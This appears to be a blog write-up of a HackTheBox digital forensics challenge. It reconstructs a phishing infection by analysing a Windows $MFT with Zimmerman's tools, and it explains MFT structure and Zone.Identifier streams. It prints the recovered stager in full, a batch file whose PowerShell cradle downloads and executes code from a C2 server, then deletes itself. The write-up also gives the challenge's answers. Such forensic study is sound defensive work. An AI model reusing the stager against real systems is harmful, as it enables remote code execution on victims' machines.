---
Title: "HTB: BFT"
date: 2025-05-07
tags:
  - windows
  - mft
  - ads
Draft: false
---

## 1. Scenario Introduction

On February 13th, a user named **Simon Stark** was observed downloading and executing a malicious ZIP file from a phishing email. This incident is suspected to involve malware infiltrating the system and attempting to communicate with a Command and Control (C2) server.

As a digital forensics analyst, you must analyze the Windows system's **Master File Table (MFT)** to reconstruct the event timeline. You need to identify the name and path of the malicious file, its creation time, the URL it was downloaded from, its offset in the MFT, and the content of the embedded malicious code.

Utilize the provided tools (MFTECmd, Timeline Explorer, Hex Editor) to find evidence of the attacker's actions and uncover the threats that compromised Simon Stark's system.

#### 1-1. Related Technologies
- MFT file analysis
- Identifying Indicators of Compromise (IoC)

## 2. Background Knowledge

### 2-1. $MFT
- **$MFT (Master File Table)**: A core data structure in the NTFS file system that records information about all files and directories.
- It is **one of the most critical system files** on an NTFS volume.

#### 2-1-1. MFT Structure
- **Each file is represented by one MFT entry**.
- **MFT Entry Size**: Typically **1024 bytes (1KB)** (though it can be 512B or 4096B depending on settings).
- An entry is composed of **attributes**.

#### 2-1-2. Entry Point
- The disk's boot sector holds the **starting cluster number of the $MFT**.
- Boot Sector → Locates $MFT → Begins parsing the file system.

#### 2-1-3. Files Under 900 Bytes and the $MFT
- **Small files under 900 bytes** can be stored **directly within the MFT (in-resident)**.
    - This improves access speed and performance.
- This is determined by the **Non-resident status of the $DATA attribute**.
    - Resident: Contained within the MFT.
    - Non-resident: Data exists in external clusters.

### 2-2. ADS
**ADS (Alternate Data Streams)** in NTFS refers to **additional data areas of a file**. It is a feature of the NTFS file system designed to allow **multiple data streams to be stored in a single file**.

#### 2-2-1. Types of ADS Streams
- **Unnamed Stream**: The main content of a file that we typically interact with. E.g., the content of `example.txt`.
- **Alternate Stream**: Hidden data stored in addition to the main stream. E.g., `example.txt:hiddenstream`.

#### 2-2-2. Zone.Identifier
**`Zone.Identifier`** is **security metadata** that uses the **Alternate Data Streams (ADS)** feature of the NTFS file system to store the **origin information** of a file.

**What is Zone.Identifier?**
- It is an **ADS stream automatically attached to files downloaded from external sources (like the internet)**.
- It is usually stored hidden, in the format `filename:Zone.Identifier`.

**Information in Zone.Identifier**
```
[ZoneTransfer]
ZoneId=3
ReferrerUrl=https://example.com
HostUrl=https://example.com/malware.zip
```
- `ZoneId`: **The security zone from which the file was downloaded**.
    - `0`: My Computer (local file)
    - `1`: Local Intranet
    - `2`: Trusted Sites
    - `3`: Internet ✅
    - `4`: Restricted Sites
- `HostUrl`: **The actual download URL**.
- `ReferrerUrl`: The browser's referrer URL at the time of download (if present).

## 3. Analysis

### 3-1. Download Evidence File
1. Open the link below in a browser to download the file, or find `BFT.zip` in the study materials and move it to your analysis OS: [BFT.zip](https://labs.hackthebox.com/api/v4/challenges/633/cdn/redirect?auth_user_id=1568173&expires=1750728881&signature=5888a0d147e5bb3e5c0bdd6deeefe79534b5db044e26d127b71540b25c3a0657)
2. Use `7z` to extract the archive. The password is `hacktheblue`.

### 3-2. Initial Analysis
#### 3-2-1. Process $MFT file
The MFT file is a table containing information about all files and directories on an NTFS volume.

You can process the original file into a readable CSV format using Eric Zimmerman's `MFTECmd.exe`.

```bash
PS C:\Users\bokchee\Desktop\EZ tools > .\MFTECmd.exe -f 'C:\Users\bokchee\Downloads\$MFT' --csv "C:\Users\bokchee\Downloads" --csvf "mft.csv"
MFTECmd version 1.3.0.0

Author: Eric Zimmerman (saericzimmerman@gmail.com)
https://github.com/EricZimmerman/MFTECmd

Command line: -f C:\Users\bokchee\Downloads\$MFT --csv C:\Users\bokchee\Downloads --csvf mft.csv

File type: Mft

Processed C:\Users\bokchee\Downloads\$MFT in 8.9430 seconds

C:\Users\bokchee\Downloads\$MFT: FILE records found: 171,927 (Free records: 142,905) File size: 307.5MB
        CSV output will be saved to C:\Users\bokchee\Downloads\mft.csv

FLARE-VM 06/23/2025 22:29:23
```

#### 3-2-2. Open with Timeline Explorer
The extracted CSV file can be effectively analyzed using Timeline Explorer.

![[Images/content/Security/DFIR/BFT/bft_1.png]]

### 3-3. Problem Solving
#### Q1. Simon Stark was attacked by an adversary on February 13th. He downloaded a ZIP file from a link in an email. What is this file?

Based on the problem description, we need to find a ZIP file.
The MFT analyzed with Timeline Explorer includes extension information.
We search by adding the filter `Contains "ZIP"`.

![[Images/content/Security/DFIR/BFT/bft_2.png]]

We can see a total of 5 ZIP files.
Of these, two files were downloaded on February 13th: `Stage-20240213T093324Z-001.zip` and `KAPE.zip`.

The other files, `invoice.zip` and `invoices.zip`, appear to be the result of extracting the `Stage-20240213T093324Z-001.zip` file, judging by their parent path.

![[Images/content/Security/DFIR/BFT/bft_3.png]]

Checking the creation time of `invoice.zip` reveals something suspicious. The creation date is 1980-01-01 08:00:00, which is significantly in the past compared to other timestamps, suggesting it might have been manipulated using a technique like Timestomping.

In contrast, `KAPE.zip` is a forensic analysis tool, so it is unlikely to be the malicious ZIP file.
Therefore, the malicious ZIP file is `Stage-20240213T093324Z-001.zip`.

#### Q2. Zone Identifier

If we clear the filter for the file we found and sort by creation time, we can identify another file with the same name right below it.

![[Images/content/Security/DFIR/BFT/bft_4.png]]

The string `:Zone.Identifier` is appended to the file extension. When a file is downloaded from the internet, the Windows system attaches a stream named `Zone.Identifier` to store information about the file's origin.

Let's examine its content.

![[Images/content/Security/DFIR/BFT/bft_5.png]]

The `HostUrl` value contains the address from which the user downloaded the file.
```
https://storage.googleapis.com/drive-bulk-export-anonymous/20240213T093324.039Z/4133399871716478688/a40aecd0-1cf3-4f88-b55a-e188d5c1c04f/1/c277a8b4-afa9-4d34-b8ca-e1eb5e5f983c?authuser
```

#### Q3. What is the full path and name of the malicious file that was executed and connected to the C2 server?

![[Images/content/Security/DFIR/BFT/bft_6.png]]

By filtering by the malicious ZIP file name and sorting by creation time, we can see the extracted files, which are in a folder named after the ZIP file.

The last file created among them is `invoice.bat`.
The full path of the file is: `C:\Users\simon.stark\Downloads\Stage-20240213T093324Z-001\Stage\invoice\invoices\invoice.bat`

#### Q4. Analyze the `$Created0x30` timestamp of the previously identified file. When was this file created on disk?

The value in the `$Created0x30` column for the found file is: 2024-02-13 16:38:39

#### Q5. Finding the hexadecimal offset of an MFT record is useful in many investigations. What is the hexadecimal offset of the stager file from Q3?

NTFS stores data for each file in records of 1024 bytes (1KB). Files that are small enough (less than 900 bytes) are stored within the MFT.

The `invoice.bat` file we identified is 286 bytes, which is small enough to be fully stored in the MFT.

To find the file's offset, we check the "Entry Number".

![[Images/content/Security/DFIR/BFT/bft_7.png]]

The Entry Number for this file is 23436.
Since each entry has a fixed size of 1024 bytes (1KB), we can calculate the actual location: 23436 * 1024 = 23998464 = 0x16E3000.

Using this offset, we can open the `$MFT` file with a hex editor like HxD to view its contents directly.

![[Images/content/Security/DFIR/BFT/bft_8.png]]

The beginning of the offset shows raw data and the filename, and the actual content starts at address 0x16E3120.

```
@echo off
start /b powershell.exe -nol -w 1 -nop -ep bypass "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://43.204.110.203:6666/download/powershell/Om1hdHRpZmVzdGFW9uIGV0dw==') -UseBasicParsing|iex"
(goto) 2>nul & del "%~f0"
```

Examining the script content reveals that it downloads and executes an unknown PowerShell script from a C2 server at IP `43.204.110.203` on port 6666.
